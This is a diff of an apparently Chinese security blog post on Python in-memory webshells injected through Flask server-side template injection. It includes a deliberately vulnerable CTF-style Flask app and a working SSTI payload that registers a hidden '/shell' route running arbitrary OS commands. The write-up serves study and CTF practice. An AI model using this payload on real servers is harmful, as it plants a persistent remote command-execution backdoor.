+    <div class="post-body" itemprop="articleBody"><h2 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h2><h3 id="什么是内存马？"><a href="#什么是内存马？" class="headerlink" title="什么是内存马？"></a>什么是内存马？</h3><p>其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大</p>
 <h3 id="什么是python内存马？"><a href="#什么是python内存马？" class="headerlink" title="什么是python内存马？"></a>什么是python内存马？</h3><p><code>Python 内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现, <code>Flask</code>框架中在<code>web</code>应用模板渲染的过程中用到<code>render_template_string</code>进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入.</p>
 <h2 id="0x02旧版Flask下的内存马"><a href="#0x02旧版Flask下的内存马" class="headerlink" title="0x02旧版Flask下的内存马"></a>0x02旧版Flask下的内存马</h2><p>为什么要说是旧版呢？这源于我在看一篇关于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">FLASK下python内存马</a>的研究的文章的时候发现21年的flask2.x和新版的flask3.x的内存马攻击姿势是不一样的，具体如何我们一步步跟着走就知道了</p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">flask不出网回显方式</a></p>
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先就是安装flask2.x版本的框架</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==2.0.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pip</span> install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
 <p>成功后我们还需要安装<strong>Werkzeug</strong>，因为我之前是用的3.x，导致跟flask2.x不兼容了，所以得降版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install &quot;werkzeug&gt;=2.0.0,&lt;3.0.0&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> <span class="string">&quot;werkzeug&gt;=2.0.0,&lt;3.0.0&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>正常的话直接安装就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install werkzeug==2.0.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pip</span> install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
 
 <p>安装好后我们输出一下flask的版本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flask.__version__)</span><br><span class="line"><span class="comment">#2.0.0</span></span><br></pre></td></tr></table></figure>
@@ -205,7 +349,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后运行框架访问5000端口就可以了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask <span class="built_in">run</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="赛题环境"><a href="#赛题环境" class="headerlink" title="赛题环境"></a>赛题环境</h3><p>然后我们来搭一个测试环境</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for, redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -260,7 +404,7 @@
 <p>这里的话是获取了一个_request_ctx_stack全局变量，以及获取当前的app</p>
 <p>所以到这里分析完了之后我们就大概可以知道一整个流程是怎么做的了，<code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到</p>
 <p>我们通过ssti执行poc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>传参后访问&#x2F;shell路由发现初始的cmd值whoami成功执行</p>
 <p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134451361.png" alt="image-20250609134451361"></p>
@@ -268,12 +412,12 @@
 <p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134557790.png" alt="image-20250609134557790"></p>
 <h2 id="0x03新版Flask下的内存马"><a href="#0x03新版Flask下的内存马" class="headerlink" title="0x03新版Flask下的内存马"></a>0x03新版Flask下的内存马</h2><p>参考文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p>
 <p>我们现在将Flask更新一下，更新到Flask3. x版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade flask</span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install <span class="comment">--upgrade flask</span></span><br></pre></td></tr></table></figure>
 
 <p>此时我的版本是flask-3.1.1 werkzeug-3.1.3</p>
 <p>然后我们试一下刚刚的poc发现出现报错了，这是为什么呢？</p>
 <p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609135108942.png" alt="image-20250609135108942"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssertionError: The setup method &#x27;add_url_rule&#x27; can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</span><br></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssertionError: The setup method <span class="string">&#x27;add_url_rule&#x27;</span> can <span class="keyword">no</span> longer <span class="keyword">be</span> called <span class="keyword">on</span> the application. It <span class="built_in">has</span> already handled its <span class="keyword">first</span> request, any <span class="keyword">changes</span> will not <span class="keyword">be</span> applied consistently.</span><br><span class="line">Make sure <span class="keyword">all</span> imports, decorators, functions, etc. needed <span class="keyword">to</span> <span class="keyword">set</span> <span class="keyword">up</span> the application are done before running it.</span><br></pre></td></tr></table></figure>
 
 <p>出现了报错？难道是我debug没关吗？但是关掉了还是这样，这是为啥？在文章中师傅指出，这是因为触发了一个check函数才造成的无法调用，但是最终还是因为flask版本问题，所以就引出了新版本的flask内存马</p>
 <p>首先我们得先了解两个方法before_request after_request</p>
@@ -333,164 +477,117 @@
 
 
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpython%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是python内存马？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%97%A7%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02旧版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E9%A2%98%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">赛题环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">debug模式下的报错回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">路由注入的内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%96%B0%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03新版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8before-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">使用before_request方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-after-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">使用 after_request方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E5%9B%9E%E9%A1%BE%E8%B5%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04回顾赛题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05sanic%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">0x05sanic下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">路由注入</span></a></li></ol></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=一些python内存马的学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=一些python内存马的学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=一些python内存马的学习&body=Check out this article: https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=一些python内存马的学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=一些python内存马的学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="一些python内存马的学习">https://wanth3f1ag.top/2025/06/09/一些python内存马的学习/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag"># python内存马</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/" rel="prev" title="Java反序列化CC6链">
+                  <i class="fa fa-angle-left"></i> Java反序列化CC6链
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/06/09/OpenHarmonyCTF2025/" rel="next" title="OpenHarmonyCTF2025">
+                  OpenHarmonyCTF2025 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
